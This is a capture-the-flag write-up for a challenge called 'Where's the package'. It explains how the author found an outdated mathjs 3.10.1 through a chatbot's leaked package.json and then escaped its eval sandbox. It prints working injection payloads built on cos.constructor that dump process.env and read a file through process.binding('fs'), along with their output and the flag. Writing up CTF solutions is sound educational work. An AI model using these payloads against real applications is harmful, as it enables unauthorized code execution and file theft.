# Where's the package - Points: ???

### Description:

<missing since site is down>

### Hints

<missing since site is down>

### Solution

*Note: I'll add screenshots once the site is back up*

The hint mentions sending `help` to the chatbox. Sending this message, the server responds with `'I'm your new best friend. If you want to know more about me just ask "tell me about yourself"`. Sending  `tell me about yourself` responds with a copy of index.js. Looking at the code, see the tell me about options are `["yourself", "index.js", "package.json"]`. You can then do `tell me about package.json` and get this file. Looking at package.json, you see the versions of the various installed packages (also hinted at by the challenge name). Quickly googling these packages, you will come across an issue with `"mathjs": "3.10.1"`. I found a pretty good tutorial on this issue [here](https://capacitorset.github.io/mathjs/).

Essentially, there is an issue with mathjs's eval. Using `cos.constructor()`, you can execute code. I first did `what is cos.constructor("return process.env")()` and got the response:

```
LANG: "en_US.UTF-8"
OLDPWD: "/"
PATH: "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
PWD: "/problems/where-s-the-package-_1_4cdb4544defb85e124b23177204f6aad"
REMOTE_HOST: "173.67.15.54"
SHLVL: "1"
_: "./start.sh"
_SYSTEMCTL_SKIP_REDIRECT: "true"
```

Now I know the PWD of the challenge. You can now read the flag with `what is cos.constructor("buffer = Buffer.allocUnsafe(64); process.binding('fs').read(process.binding('fs').open('/problems/where-s-the-package-_1_4cdb4544defb85e124b23177204f6aad/flag', 0, 0600), buffer, 0, 64); return buffer.toString()")()
`

### Flag: `ACI{233c0f165c26a20fb119c8ccc32}`
